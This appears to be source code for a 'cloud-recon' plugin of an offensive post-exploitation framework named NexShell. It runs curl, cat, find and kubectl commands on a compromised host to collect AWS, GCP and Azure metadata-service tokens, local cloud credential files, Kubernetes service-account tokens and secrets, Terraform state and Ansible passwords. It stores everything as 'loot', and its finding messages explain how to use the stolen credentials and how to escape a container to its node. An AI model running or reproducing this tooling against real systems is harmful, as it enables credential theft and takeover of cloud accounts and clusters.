#!/usr/bin/env python3
"""
NexShell Plugin — Cloud Recon  (plugins/cloud_recon.py)
Cloud environment enumeration: AWS, GCP, Azure, Kubernetes.

Coverage:
  - IMDS (Instance Metadata Service) for AWS / GCP / Azure / Oracle / Alibaba
  - IAM roles, instance profiles, attached policies
  - S3 bucket listing & public access detection
  - AWS SSO cache & credential files
  - GCP service account tokens & project metadata
  - Azure managed identity tokens & resource enumeration
  - Kubernetes API server discovery & RBAC checks
  - Terraform state files (secrets exposure)
  - Cloud-init / user-data retrieval
  - Container runtime environment detection

Usage:
    (NexShell)> plugins run cloud-recon
    (NexShell)> plugins run cloud-recon --deep
    (NexShell)> plugins run cloud-recon --provider aws
"""

import re
import json
from core.plugin import NexPlugin


class CloudRecon(NexPlugin):
    name        = "cloud-recon"
    description = "Cloud environment recon — AWS/GCP/Azure/K8s IMDS, IAM, buckets, tokens"
    author      = "vulnquest58"
    version     = "1.0"
    platform    = "all"
    category    = "recon"
    mitre_id    = "T1552.005"

    # ── AWS IMDS checks ───────────────────────────────────────────────────────
    AWS_CHECKS = [
        # IMDSv1 (unauthenticated)
        ("curl -s -m 3 http://169.254.169.254/latest/meta-data/",
         "aws_imds_root", "AWS IMDS Root"),
        ("curl -s -m 3 http://169.254.169.254/latest/meta-data/instance-id",
         "aws_instance_id", "AWS Instance ID"),
        ("curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/info",
         "aws_iam_info", "AWS IAM Instance Profile"),
        ("curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "aws_iam_role", "AWS IAM Role Name"),
        ("curl -s -m 3 'http://169.254.169.254/latest/meta-data/iam/security-credentials/__ROLE__'",
         "aws_iam_creds", "AWS IAM Temp Credentials"),
        ("curl -s -m 3 http://169.254.169.254/latest/meta-data/local-ipv4",
         "aws_local_ip", "AWS Local IP"),
        ("curl -s -m 3 http://169.254.169.254/latest/meta-data/public-hostname",
         "aws_public_host", "AWS Public Hostname"),
        ("curl -s -m 3 http://169.254.169.254/latest/meta-data/placement/region",
         "aws_region", "AWS Region"),
        ("curl -s -m 3 http://169.254.169.254/latest/user-data",
         "aws_userdata", "AWS User Data (cloud-init)"),
        # IMDSv2 token attempt
        ("curl -s -m 3 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'",
         "aws_imdsv2_token", "AWS IMDSv2 Token"),
        # ECS metadata
        ("curl -s -m 3 ${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-/not-ecs} 2>/dev/null",
         "aws_ecs_creds", "AWS ECS Container Credentials"),
        # Lambda context
        ("env | grep -iE 'AWS_|LAMBDA_|FUNCTION_NAME'",
         "aws_lambda_env", "AWS Lambda Environment"),
        # Local credential files
        ("cat ~/.aws/credentials 2>/dev/null",
         "aws_cred_file", "AWS Credential File"),
        ("cat ~/.aws/config 2>/dev/null",
         "aws_config_file", "AWS Config File"),
        ("ls -la ~/.aws/sso/cache/ 2>/dev/null && cat ~/.aws/sso/cache/*.json 2>/dev/null",
         "aws_sso_cache", "AWS SSO Cache (access tokens)"),
        # CloudShell
        ("env | grep -i CLOUDSHELL",
         "aws_cloudshell", "AWS CloudShell Detection"),
    ]

    # ── GCP IMDS checks ───────────────────────────────────────────────────────
    GCP_CHECKS = [
        ("curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/'",
         "gcp_imds_root", "GCP IMDS Root"),
        ("curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/'",
         "gcp_instance", "GCP Instance Metadata"),
        ("curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/project/project-id'",
         "gcp_project_id", "GCP Project ID"),
        ("curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/'",
         "gcp_sa_list", "GCP Service Accounts"),
        ("curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'",
         "gcp_sa_token", "GCP Default SA Token"),
        ("curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes'",
         "gcp_sa_scopes", "GCP SA Scopes"),
        ("curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/'",
         "gcp_attributes", "GCP Instance Attributes (may contain secrets)"),
        ("curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys'",
         "gcp_ssh_keys", "GCP SSH Keys in Metadata"),
        ("cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null",
         "gcp_adc", "GCP Application Default Credentials"),
        ("cat ~/.config/gcloud/credentials.db 2>/dev/null",
         "gcp_cred_db", "GCP Credential DB"),
        ("gcloud auth list 2>/dev/null",
         "gcp_auth_list", "GCP Active Accounts"),
        ("gcloud config list 2>/dev/null",
         "gcp_config", "GCP Config"),
    ]

    # ── Azure IMDS checks ─────────────────────────────────────────────────────
    AZURE_CHECKS = [
        ("curl -s -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
         "azure_imds_instance", "Azure IMDS Instance"),
        ("curl -s -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
         "azure_managed_id_token", "Azure Managed Identity Token (ARM)"),
        ("curl -s -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/'",
         "azure_keyvault_token", "Azure Managed Identity Token (KeyVault)"),
        ("curl -s -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/'",
         "azure_graph_token", "Azure Managed Identity Token (Graph)"),
        ("cat ~/.azure/accessTokens.json 2>/dev/null",
         "azure_token_file", "Azure CLI Token File"),
        ("cat ~/.azure/azureProfile.json 2>/dev/null",
         "azure_profile", "Azure Profile"),
        ("env | grep -iE 'AZURE_|MSI_ENDPOINT|IDENTITY_ENDPOINT|APPSETTING'",
         "azure_env", "Azure Environment Variables"),
        # Azure Functions / App Service
        ("curl -s -m 3 ${MSI_ENDPOINT}?resource=https://management.azure.com/ -H 'Secret: '${MSI_SECRET} 2>/dev/null",
         "azure_msi_func", "Azure Functions MSI Token"),
        ("curl -s -m 3 ${IDENTITY_ENDPOINT}?resource=https://management.azure.com/ -H 'X-IDENTITY-HEADER: '${IDENTITY_HEADER} 2>/dev/null",
         "azure_identity_ep", "Azure Identity Endpoint Token"),
    ]

    # ── Kubernetes checks ─────────────────────────────────────────────────────
    K8S_CHECKS = [
        # Service account token
        ("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
         "k8s_sa_token", "K8s ServiceAccount Token"),
        ("cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null",
         "k8s_namespace", "K8s Namespace"),
        ("cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -5",
         "k8s_ca_cert", "K8s CA Certificate"),
        # API server access
        ("curl -s -m 3 https://kubernetes.default.svc/api --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H 'Authorization: Bearer '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) 2>/dev/null",
         "k8s_api_access", "K8s API Server Access"),
        # RBAC: what can we do?
        ("kubectl auth can-i --list 2>/dev/null",
         "k8s_rbac_list", "K8s RBAC: Can-I List"),
        ("kubectl get pods --all-namespaces 2>/dev/null",
         "k8s_pods", "K8s: All Pods"),
        ("kubectl get secrets --all-namespaces 2>/dev/null",
         "k8s_secrets", "K8s: All Secrets"),
        ("kubectl get nodes 2>/dev/null",
         "k8s_nodes", "K8s: Nodes"),
        ("kubectl get clusterroles 2>/dev/null | head -20",
         "k8s_clusterroles", "K8s: ClusterRoles"),
        # Kubeconfig
        ("cat ~/.kube/config 2>/dev/null",
         "k8s_kubeconfig", "Kubeconfig"),
        ("ls -la ~/.kube/ 2>/dev/null",
         "k8s_kube_dir", "Kube Directory"),
        # Environment
        ("env | grep -iE 'KUBERNETES_|KUBE_|K8S_'",
         "k8s_env", "K8s Environment Variables"),
    ]

    # ── IaC & Terraform ───────────────────────────────────────────────────────
    IAC_CHECKS = [
        (r"find / -name 'terraform.tfstate*' -not -path '*/\..*' 2>/dev/null | head -10",
         "tf_state_paths", "Terraform State Files (Paths)"),
        (r"find / -name '*.tfvars' -not -path '*/\..*' 2>/dev/null | head -10",
         "tfvars_paths", "Terraform Variable Files"),
        (r"find / -name '*.tfstate' -not -path '*/\.*' 2>/dev/null -exec grep -l 'password\|secret\|token\|access_key' {} \; 2>/dev/null | head -5",
         "tf_state_secrets", "Terraform State with Secrets"),
        ("find / -name '.terraform' -type d 2>/dev/null | head -5",
         "tf_dirs", "Terraform Directories"),
        # Pulumi
        ("cat ~/.pulumi/credentials.json 2>/dev/null",
         "pulumi_creds", "Pulumi Credentials"),
        # Ansible
        ("find / -name 'vault_pass*' -o -name '.vault_password*' 2>/dev/null | head -5",
         "ansible_vault", "Ansible Vault Password Files"),
        ("find / -name '*.yml' -o -name '*.yaml' 2>/dev/null | xargs grep -l 'ansible_become_pass\\|ansible_ssh_pass' 2>/dev/null | head -5",
         "ansible_creds", "Ansible Plaintext Passwords"),
    ]

    # ── Finding patterns ──────────────────────────────────────────────────────
    FINDING_PATTERNS = {
        "aws_imds_root": [
            (r"ami-id|instance-id|local-ipv4",
             "High", "AWS EC2 IMDS Accessible (IMDSv1)",
             "AWS Instance Metadata Service v1 is accessible without authentication. Steal IAM credentials via /iam/security-credentials/<role>. Enforce IMDSv2 with hop limit 1."),
        ],
        "aws_iam_creds": [
            (r'"AccessKeyId"',
             "Critical", "AWS IAM Temporary Credentials Stolen",
             "Fetched AWS STS credentials from IMDS. Configure AWS CLI with these keys and use 'aws sts get-caller-identity' to confirm role. Then enumerate permissions."),
        ],
        "aws_userdata": [
            (r"(?i)(password|secret|key|token)",
             "Critical", "Secrets in AWS User Data",
             "AWS user-data (cloud-init) contains sensitive strings. User-data is accessible by any process on the instance."),
        ],
        "aws_sso_cache": [
            (r'"accessToken"',
             "High", "AWS SSO Access Token in Cache",
             "AWS SSO access token found. Use 'aws sso login' cache to authenticate. Tokens are valid for session duration."),
        ],
        "gcp_sa_token": [
            (r'"access_token"',
             "Critical", "GCP Service Account Token Stolen",
             "GCP OAuth2 access token obtained from IMDS. Use token to authenticate to GCP APIs. Check scopes for privilege assessment."),
        ],
        "gcp_attributes": [
            (r"(?i)(password|secret|key|token)",
             "Critical", "Secrets in GCP Instance Attributes",
             "GCP instance attributes contain sensitive data. Attributes are accessible to all processes on the instance."),
        ],
        "gcp_ssh_keys": [
            (r"ssh-",
             "High", "SSH Keys in GCP Metadata",
             "SSH public keys found in GCP metadata — all listed users can SSH to this instance."),
        ],
        "azure_managed_id_token": [
            (r'"access_token"',
             "Critical", "Azure Managed Identity Token Obtained",
             "Azure managed identity token obtained. Use to authenticate to Azure Resource Manager. Run: az login --identity"),
        ],
        "azure_keyvault_token": [
            (r'"access_token"',
             "Critical", "Azure Key Vault Token Obtained",
             "Azure managed identity can access Key Vault. Enumerate secrets with: az keyvault secret list --vault-name <vault>"),
        ],
        "azure_graph_token": [
            (r'"access_token"',
             "High", "Azure Graph API Token Obtained",
             "Token for Microsoft Graph API obtained. Can enumerate Azure AD users, groups, applications."),
        ],
        "k8s_sa_token": [
            (r"eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+",
             "Critical", "Kubernetes ServiceAccount JWT Token Found",
             "K8s JWT found. Use to authenticate: curl -H 'Authorization: Bearer <token>' https://kubernetes.default.svc/api. Check RBAC permissions."),
        ],
        "k8s_secrets": [
            (r"\bSecretType\b|\bOpaque\b|\bDockerConfigJson\b",
             "Critical", "Kubernetes Secrets Listable",
             "ServiceAccount can list K8s secrets — read all secrets with: kubectl get secret <name> -o yaml"),
        ],
        "k8s_rbac_list": [
            (r"\*\s+\*\s+\*",
             "Critical", "Kubernetes Cluster-Admin Privileges",
             "ServiceAccount has wildcard (*/*/*) permissions — full cluster-admin access."),
            (r"create.*pods",
             "High", "K8s: Can Create Pods (Container Escape Risk)",
             "Can create pods — deploy privileged pod to escape to node: kubectl run pwn --image=alpine --overrides='{...}'"),
        ],
        "tf_state_secrets": [
            (r"\S",
             "Critical", "Secrets in Terraform State File",
             "Terraform state files contain sensitive values in plaintext. State files should be encrypted and stored remotely with restricted access."),
        ],
        "pulumi_creds": [
            (r'"accessToken"',
             "High", "Pulumi Access Token Found",
             "Pulumi credentials file found. Token grants access to Pulumi Cloud stack state and secrets."),
        ],
    }

    def run(self, session, args: list):
        deep     = '--deep' in (args or [])
        provider = None
        for a in (args or []):
            if a.startswith('--provider='):
                provider = a.split('=', 1)[1].lower()

        self.info("Starting cloud-recon v1.0 ...")
        sections   = []
        collected  = {}

        # Build check list based on provider filter
        all_checks = []
        if not provider or provider == 'aws':
            all_checks += [('AWS', c) for c in self.AWS_CHECKS]
        if not provider or provider == 'gcp':
            all_checks += [('GCP', c) for c in self.GCP_CHECKS]
        if not provider or provider == 'azure':
            all_checks += [('Azure', c) for c in self.AZURE_CHECKS]
        if not provider or provider == 'k8s':
            all_checks += [('K8s', c) for c in self.K8S_CHECKS]
        if not provider or provider == 'iac':
            all_checks += [('IaC', c) for c in self.IAC_CHECKS]

        current_provider = None
        for prov, (cmd, key, label) in all_checks:
            if prov != current_provider:
                sections.append(f"\n{'═'*64}")
                sections.append(f"  [{prov}]")
                sections.append('═'*64)
                current_provider = prov

            try:
                out = self._exec(session, cmd)
                if not out.strip() or 'not found' in out.lower():
                    continue

                collected[key] = out
                self.loot(out, category='credentials', source=f"cloud-recon:{key}")

                # Try to parse JSON for cleaner display
                display = out.strip()
                try:
                    parsed = json.loads(out)
                    display = json.dumps(parsed, indent=2)[:600]
                except Exception:
                    display = out.strip()[:600]

                sections.append(f"\n  [{label}]")
                sections.append('─'*64)
                sections.append(display)

            except Exception as e:
                self.warn(f"Check failed [{label}]: {e}")

        # ── Auto-findings ─────────────────────────────────────────────────────
        findings_created = 0

        # Handle IAM role credential fetching (multi-step)
        iam_role = collected.get('aws_iam_role', '').strip()
        if iam_role and not collected.get('aws_iam_creds'):
            role_name = iam_role.strip().splitlines()[0].strip()
            creds_cmd = f"curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
            creds_out = self._exec(session, creds_cmd)
            if creds_out.strip():
                collected['aws_iam_creds'] = creds_out
                self.loot(creds_out, category='credentials', source='cloud-recon:aws_iam_creds')
                sections.append(f"\n  [AWS IAM Credentials for role: {role_name}]")
                sections.append('─'*64)
                sections.append(creds_out[:600])

        for key, patterns in self.FINDING_PATTERNS.items():
            text = collected.get(key, '')
            if not text:
                continue
            for pattern, severity, title, recommendation in patterns:
                if re.search(pattern, text, re.MULTILINE | re.IGNORECASE):
                    self.finding(
                        title          = title,
                        description    = f"Source: [{key}]\n\n{text[:500]}",
                        severity       = severity,
                        recommendation = recommendation,
                        mitre_id       = self.mitre_id,
                    )
                    self.emit('finding.created', severity=severity, title=title, plugin=self.name)
                    findings_created += 1

        # ── Cloud provider summary ────────────────────────────────────────────
        providers_found = set()
        if collected.get('aws_imds_root'):
            providers_found.add('AWS EC2')
        if collected.get('aws_lambda_env'):
            providers_found.add('AWS Lambda')
        if collected.get('aws_ecs_creds'):
            providers_found.add('AWS ECS')
        if collected.get('gcp_imds_root'):
            providers_found.add('GCP')
        if collected.get('azure_imds_instance'):
            providers_found.add('Azure')
        if collected.get('k8s_sa_token'):
            providers_found.add('Kubernetes')

        if providers_found:
            sections.append(f"\n[+] Cloud environments detected: {', '.join(providers_found)}")

        self.info(f"cloud-recon complete — {len(providers_found)} providers, {findings_created} findings.")
        return '\n'.join(sections) if sections else "No cloud environment detected."
